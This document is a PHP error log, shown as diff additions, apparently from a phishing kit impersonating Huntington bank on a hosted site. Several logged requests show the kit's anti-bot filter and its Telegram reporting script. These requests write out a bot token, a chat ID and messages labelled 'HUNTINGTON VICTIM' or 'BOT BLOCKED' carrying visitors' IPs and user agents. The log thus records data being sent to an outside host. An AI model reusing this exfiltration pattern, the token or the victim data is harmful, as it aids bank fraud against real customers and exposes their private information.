+[13-Nov-2022 11:50:04 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[13-Nov-2022 15:36:34 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=BOT+BLOCKED%0A%0A%7C+DEVICE+%3A+%2379d2f3ce4afcc75165a3c25a6b776118%0A%7C+IP+%3A+67.219.192.37%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28Linux%3B+Android+8.0.0%3B+Pixel+2+XL+Build%2FOPD1.170816.004%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F75.0.3765.0+Mobile+Safari%2F537.36%0A%7C+URL+%3A+https%3A%2F%2Fwww.pasaal.online%2Ftests%2Fmobile%2F%3Ftoken%3D02340tgeribdhjxchvjbdfshjghdgsurigiruet%0A%7C+REASON+%3A+Bad+hostname+%28google%29&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[14-Nov-2022 04:32:58 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=BOT+BLOCKED%0A%0A%7C+DEVICE+%3A+%23da399afdb7408ed295aca251e64127de%0A%7C+IP+%3A+190.112.193.2%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_15_7%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F91.0.4472.77+Safari%2F537.36%0A%7C+URL+%3A+https%3A%2F%2Fwww.pasaal.online%2Ftests%2Fmobile%2F%3Ftoken%3Dnvchnv3949030visdugierpp1wjfjjjzxnbe%0A%7C+REASON+%3A+Bad+hostname+%28nwstack.com%29&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
+[14-Nov-2022 05:58:31 UTC] PHP Fatal error:  Uncaught Error: Undefined constant "HTTP_HOST" in /home/pasaal/public_html/tests/mobile/includes/antibot.php:104
+Stack trace:
+#0 /home/pasaal/public_html/tests/mobile/includes/antibot.php(124): checkbot()
+#1 /home/pasaal/public_html/tests/mobile/login.php(4): include('/home/pasaal/pu...')
+#2 {main}
+  thrown in /home/pasaal/public_html/tests/mobile/includes/antibot.php on line 104
+[28-Nov-2022 15:52:18 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot5141903083:AAHCLQYnjVhxt775S51hq6L4wZ14f1S5oWI/sendMessage?chat_id=-1001746796636&amp;text=HUNTINGTON+VICTIM%0A%0A%7C+DEVICE+%3A+%237699a9fb10995be0d0f941b6f5e62a4e%0A%7C+IP+%3A+173.91.26.86%0A%7C+USER+AGENT+%3A+Mozilla%2F5.0+%28X11%3B+Ubuntu%3B+Linux+i686%3B+rv%3A24.0%29+Gecko%2F20100101+Firefox%2F24.0+Chrome%2F80.0.3987.132+Safari%2F537.36&amp;parse_mode=HTML): Failed to open stream: HTTP request failed! HTTP/1.1 401 Unauthorized
+ in /home/pasaal/public_html/tests/mobile/includes/telegram.php on line 6
